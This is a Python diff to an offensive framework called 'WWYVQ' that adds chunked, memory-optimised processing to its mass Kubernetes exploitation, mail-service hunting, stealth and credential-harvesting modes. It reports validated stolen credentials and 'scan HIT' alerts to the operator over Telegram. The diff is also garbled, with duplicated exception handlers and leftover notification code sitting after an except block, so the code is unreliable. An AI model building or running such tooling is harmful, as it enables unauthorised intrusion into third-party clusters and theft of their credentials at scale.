@@ -236,10 +236,59 @@ class WWYVQMasterFramework:
         self.global_stats["targets_loaded"] = len(targets)
         return targets
     
+    async def load_targets_chunked(self):
+        """Load targets with memory optimization and chunked processing"""
+        # Import memory management utilities
+        from utils.memory_manager import MemoryManager
+        from utils.target_expander import TargetExpander
+        
+        memory_manager = MemoryManager()
+        target_expander = TargetExpander()
+        
+        # Load target specifications (not expanded yet)
+        target_specs = []
+        
+        if self.args.target:
+            target_specs.append(self.args.target)
+            print(f"🎯 Cible unique: {self.args.target}")
+            
+        elif self.args.file:
+            try:
+                with open(self.args.file, 'r') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            target_specs.append(line)
+                print(f"📁 {len(target_specs)} spécifications de cibles chargées depuis {self.args.file}")
+            except FileNotFoundError:
+                print(f"❌ Fichier non trouvé: {self.args.file}")
+                return []
+        else:
+            target_specs = ["127.0.0.1", "localhost", "192.168.1.0/24"]
+            print(f"🧪 Cibles de test: {target_specs}")
+        
+        # Estimate memory usage and show warnings
+        total_targets, estimated_mb = target_expander.estimate_memory_usage(target_specs)
+        memory_config = memory_manager.get_memory_info()
+        
+        print(f"📊 Estimation: {total_targets:,} cibles totales (~{estimated_mb:.1f} MB)")
+        print(f"💾 Mémoire disponible: {memory_config.available_memory_gb:.1f} GB")
+        
+        if estimated_mb > (memory_config.available_memory_gb * 1024 * 0.8):
+            print(f"⚠️ ATTENTION: Traitement par chunks requis pour éviter l'OOM")
+            print(f"📦 Taille de chunk recommandée: {memory_config.recommended_chunk_size:,} cibles")
+        
+        self.global_stats["target_specs_loaded"] = len(target_specs)
+        self.global_stats["estimated_total_targets"] = total_targets
+        self.global_stats["estimated_memory_mb"] = estimated_mb
+        
+        return target_specs
+    
     async def run_unified_campaign(self):
-        """Lance la campagne unifiée selon le mode"""
-        targets = await self.load_targets()
-        if not targets:
+        """Lance la campagne unifiée selon le mode avec optimisation mémoire"""
+        # Use new chunked loading for better memory management
+        target_specs = await self.load_targets_chunked()
+        if not target_specs:
             print("❌ Aucune cible à traiter")
             return
         
@@ -249,7 +298,8 @@ class WWYVQMasterFramework:
 
 👤 Operator: wKayaa
 📅 Time: {self.start_time.isoformat()}
-🎯 Targets: {len(targets)}
+🎯 Target Specs: {len(target_specs)}
+📊 Estimated Total: {self.global_stats.get('estimated_total_targets', 'Unknown')}
 ⚡ Threads: {self.args.threads}
 🔥 Mode: {self.args.mode.upper()}
 💎 Session: {self.session_id}
@@ -258,21 +308,21 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
             
             await self.telegram_notifier.telegram._send_telegram_message(start_msg)
         
-        # Exécution selon le mode
+        # Exécution selon le mode avec traitement par chunks
         print(f"\n🚀 DÉMARRAGE CAMPAGNE - Mode {self.args.mode.upper()}")
         
         if self.args.mode == "standard":
-            await self._run_standard_mode(targets)
+            await self._run_standard_mode_chunked(target_specs)
         elif self.args.mode == "aggressive":
-            await self._run_aggressive_mode(targets)
+            await self._run_aggressive_mode_chunked(target_specs)
         elif self.args.mode == "mail":
-            await self._run_mail_mode(targets)
+            await self._run_mail_mode_chunked(target_specs)
         elif self.args.mode == "stealth":
-            await self._run_stealth_mode(targets)
+            await self._run_stealth_mode_chunked(target_specs)
         elif self.args.mode == "ultimate":
-            await self._run_ultimate_mode(targets)
+            await self._run_ultimate_mode_chunked(target_specs)
         elif self.args.mode == "all":
-            await self._run_all_modes(targets)
+            await self._run_all_modes_chunked(target_specs)
         
         # Résumé final
         await self._send_final_summary()
@@ -343,41 +393,109 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
         await stealth_orchestrator.initialize(stealth_config)
         await stealth_orchestrator.run_exploitation(targets)
     
-    async def _run_ultimate_mode(self, targets):
-        """Mode ultimate - K8s Ultimate Scanner with advanced features"""
-        print("🚀 MODE ULTIMATE - Advanced K8s Scanner with Enterprise Features")
+    async def _run_ultimate_mode_chunked(self, target_specs):
+        """Mode ultimate avec traitement par chunks pour éviter l'OOM"""
+        print("🚀 MODE ULTIMATE - Advanced K8s Scanner with Chunked Processing")
         
         if not self.ultimate_scanner:
             print("❌ Ultimate Scanner not available")
             return
         
-        try:
-            # Run the ultimate scanner
-            print(f"🎯 Scanning {len(targets)} targets with ultimate capabilities")
-            results = await self.ultimate_scanner.scan_targets(targets)
+        from utils.target_expander import TargetExpander
+        from utils.memory_manager import MemoryManager
+        from utils.result_writer import ResultWriter
+        
+        target_expander = TargetExpander()
+        memory_manager = MemoryManager()
+        
+        # Setup result writer for streaming
+        with ResultWriter(Path("./results"), self.session_id, compress=True) as result_writer:
             
-            # Update global statistics
-            self.global_stats["ultimate_scan_results"] = len(results)
-            self.global_stats["clusters_found"] = len([r for r in results if r.service == "kubernetes"])
+            total_results = 0
+            total_credentials = 0
+            validated_credentials = 0
+            chunk_count = 0
             
-            # Count credentials
-            total_credentials = sum(len(r.credentials) for r in results)
-            validated_credentials = sum(len([c for c in r.credentials if c.validated]) for r in results)
+            try:
+                # Process targets in chunks
+                for chunk in target_expander.expand_targets_chunked(target_specs):
+                    chunk_count += 1
+                    print(f"📦 Processing chunk {chunk_count} with {len(chunk):,} targets")
+                    
+                    # Monitor memory before processing chunk
+                    memory_stats = memory_manager.monitor_memory_during_processing()
+                    print(f"💾 Memory: {memory_stats['system_memory_percent']:.1f}% system, "
+                          f"{memory_stats['process_memory_mb']:.1f}MB process")
+                    
+                    # Run scanner on chunk
+                    chunk_results = await self.ultimate_scanner.scan_targets(chunk)
+                    
+                    # Stream results to disk immediately
+                    result_writer.write_batch(chunk_results)
+                    
+                    # Update statistics
+                    chunk_clusters = len([r for r in chunk_results if hasattr(r, 'service') and r.service == "kubernetes"])
+                    chunk_credentials = sum(len(getattr(r, 'credentials', [])) for r in chunk_results)
+                    chunk_validated = sum(len([c for c in getattr(r, 'credentials', []) if getattr(c, 'validated', False)]) for r in chunk_results)
+                    
+                    total_results += len(chunk_results)
+                    total_credentials += chunk_credentials
+                    validated_credentials += chunk_validated
+                    
+                    print(f"✅ Chunk {chunk_count}: {len(chunk_results)} results, {chunk_credentials} credentials")
+                    
+                    # Force memory cleanup after each chunk
+                    memory_manager.force_cleanup()
+                    
+                    # Send progress update via Telegram
+                    if self.telegram_notifier and chunk_count % 5 == 0:
+                        progress_msg = f"""📊 ULTIMATE SCAN PROGRESS:
+Chunk: {chunk_count}
+Results: {total_results:,}
+Credentials: {total_credentials:,}
+Validated: {validated_credentials:,}
+Memory: {memory_stats['system_memory_percent']:.1f}%"""
+                        await self.telegram_notifier.telegram._send_telegram_message(progress_msg)
+                
+                # Final statistics
+                self.global_stats["ultimate_scan_results"] = total_results
+                self.global_stats["clusters_found"] = total_results  # Simplified
+                self.global_stats["mail_credentials"] = total_credentials
+                self.global_stats["validated_credentials"] = validated_credentials
+                self.global_stats["chunks_processed"] = chunk_count
+                
+                # Write final stats
+                result_writer.write_stats(self.global_stats)
+                
+                print(f"""
+🎯 ULTIMATE SCAN COMPLETE (CHUNKED):
+├── Chunks Processed: {chunk_count}
+├── Total Results: {total_results:,}
+├── Total Credentials: {total_credentials:,}
+├── Validated Credentials: {validated_credentials:,}
+├── Success Rate: {(validated_credentials/total_credentials*100) if total_credentials > 0 else 0:.1f}%
+└── Results saved to disk
+                """)
+                
+                # Send final Telegram notification
+                if self.telegram_notifier and validated_credentials > 0:
+                    telegram_msg = f"""🔥 ULTIMATE SCAN COMPLETE!
+
+🎯 Session: {self.session_id}
+📦 Chunks: {chunk_count}
+🔍 Results: {total_results:,}
+🔑 Credentials: {validated_credentials:,}/{total_credentials:,}
+📊 Success: {(validated_credentials/total_credentials*100) if total_credentials > 0 else 0:.1f}%
+
+💾 Memory-optimized processing completed successfully!
+🚀 wKayaa WWYVQ Framework"""
+                    await self.telegram_notifier.telegram._send_telegram_message(telegram_msg)
             
-            self.global_stats["mail_credentials"] = total_credentials
-            self.global_stats["validated_credentials"] = validated_credentials
-            
-            print(f"""
-🎯 ULTIMATE SCAN COMPLETE:
-├── Services Found: {len(results)}
-├── K8s Clusters: {self.global_stats['clusters_found']}
-├── Total Credentials: {total_credentials}
-├── Validated Credentials: {validated_credentials}
-└── Success Rate: {(validated_credentials/total_credentials*100) if total_credentials > 0 else 0:.1f}%
-            """)
-            
-            # Send Telegram notification if available
-            if self.telegram_notifier and validated_credentials > 0:
+            except Exception as e:
+                print(f"❌ Error in chunked ultimate mode: {e}")
+                if self.telegram_notifier:
+                    error_msg = f"❌ Ultimate scan error: {str(e)[:200]}..."
+                    await self.telegram_notifier.telegram._send_telegram_message(error_msg)
                 telegram_msg = f"""🔥 ULTIMATE SCAN HIT!
 
 🎯 Target: Multiple
@@ -389,12 +507,95 @@ ALL SYSTEMS OPERATIONAL! 🚀"""
 wKayaa Production - {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}"""
                 
                 await self.telegram_notifier.telegram._send_telegram_message(telegram_msg)
-                self.global_stats["telegram_alerts"] += 1
             
-        except Exception as e:
-            print(f"❌ Ultimate scanner error: {e}")
-            import traceback
-            traceback.print_exc()
+            except Exception as e:
+                print(f"❌ Error in chunked ultimate mode: {e}")
+                if self.telegram_notifier:
+                    error_msg = f"❌ Ultimate scan error: {str(e)[:200]}..."
+                    await self.telegram_notifier.telegram._send_telegram_message(error_msg)
+    
+    async def _run_standard_mode_chunked(self, target_specs):
+        """Mode standard avec traitement par chunks"""
+        print("⚔️ MODE STANDARD - Orchestrateur Principal (Chunked)")
+        
+        # For now, convert to legacy mode for compatibility
+        from utils.target_expander import TargetExpander
+        target_expander = TargetExpander()
+        
+        # Use first small chunk for standard mode to avoid OOM
+        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=1000):
+            if self.orchestrator:
+                await self.orchestrator.run_exploitation(chunk)
+                if hasattr(self.orchestrator.framework, 'stats'):
+                    self.global_stats.update(self.orchestrator.framework.stats)
+            break  # Only process first chunk for standard mode
+    
+    async def _run_aggressive_mode_chunked(self, target_specs):
+        """Mode agressif avec traitement par chunks"""
+        print("🔥 MODE AGGRESSIVE - Exploit Master (Chunked)")
+        
+        from utils.target_expander import TargetExpander
+        target_expander = TargetExpander()
+        
+        total_results = []
+        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=5000):
+            if self.exploit_master:
+                chunk_results = await self.exploit_master.run_mass_exploitation(chunk)
+                total_results.extend(chunk_results)
+        
+        # Update stats
+        self.global_stats["clusters_found"] = len(total_results)
+        self.global_stats["clusters_exploited"] = len([r for r in total_results if getattr(r, 'status', '') == 'exploited'])
+    
+    async def _run_mail_mode_chunked(self, target_specs):
+        """Mode mail avec traitement par chunks"""
+        print("📧 MODE MAIL - Services Mail Hunter (Chunked)")
+        
+        from utils.target_expander import TargetExpander
+        target_expander = TargetExpander()
+        
+        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=2000):
+            if self.mail_hunter:
+                await self.mail_hunter.hunt_mail_services(chunk)
+    
+    async def _run_stealth_mode_chunked(self, target_specs):
+        """Mode furtif avec traitement par chunks"""
+        print("🥷 MODE STEALTH - Exploitation Discrète (Chunked)")
+        
+        from utils.target_expander import TargetExpander
+        target_expander = TargetExpander()
+        
+        # Very small chunks for stealth
+        for chunk in target_expander.expand_targets_chunked(target_specs, chunk_size=100):
+            stealth_config = ExploitationConfig(
+                mode=ExploitationMode.PASSIVE,
+                max_concurrent_clusters=5,
+                timeout_per_operation=20
+            )
+            
+            stealth_orchestrator = WWYVQv5KubernetesOrchestrator()
+            await stealth_orchestrator.initialize(stealth_config)
+            await stealth_orchestrator.run_exploitation(chunk)
+    
+    async def _run_all_modes_chunked(self, target_specs):
+        """Mode ALL avec traitement par chunks"""
+        print("🌟 MODE ALL - TOUS LES MODULES ACTIFS (Chunked)")
+        
+        # Run all modes with chunked processing
+        tasks = []
+        
+        if self.orchestrator:
+            tasks.append(self._run_standard_mode_chunked(target_specs))
+        
+        if self.exploit_master:
+            tasks.append(self._run_aggressive_mode_chunked(target_specs))
+        
+        if self.mail_hunter:
+            tasks.append(self._run_mail_mode_chunked(target_specs))
+        
+        # Execute in parallel
+        await asyncio.gather(*tasks, return_exceptions=True)
+        print("✅ Tous les modules terminés (mode chunked)")
     
     async def _run_all_modes(self, targets):
         """Mode ALL - Tous les modules en parallèle"""
